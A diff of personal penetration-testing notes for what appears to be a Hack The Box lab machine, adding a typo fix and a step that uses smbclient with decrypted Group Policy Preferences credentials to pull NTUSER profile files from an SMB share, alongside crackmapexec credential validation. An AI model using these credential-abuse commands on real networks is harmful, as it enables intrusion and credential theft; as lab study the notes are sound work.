@@ -72,7 +72,7 @@ gpp-decrypt 'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuN
 
 Credentials `active.htb\SVC_TGS:GPPstillStandingStrong2k18`
 
-- If we test de credenials using [[crackmapexec]] , they are valid
+- If we test de credentials using [[crackmapexec]] , they are valid
 ```bash
 crackmapexec smb 10.10.10.100 -u 'active.htb\SVC_TGS' -p 'GPPstillStandingStrong2k18'
 ```
@@ -120,4 +120,10 @@ crackmapexec smb 10.10.10.100 -u 'active.htb\SVC_TGS' -p 'GPPstillStandingStrong
 >![[Pasted image 20250311023023.png]]
 
 
-- 
+- The share "users" if quite iteresting, because  inside "Default" folder we found some file named "NTUSER" this type of files contains recient access and credentials, we can use a tool like [[regripper]]
+```bash
+smbclient //10.10.10.100/Users -U active.htb/SVC_TGS%GPPstillStandingStrong2k18 -c 'mget "Default"/*'
+```
+>[!example]- Result
+>![[Pasted image 20250311115549.png]]
+
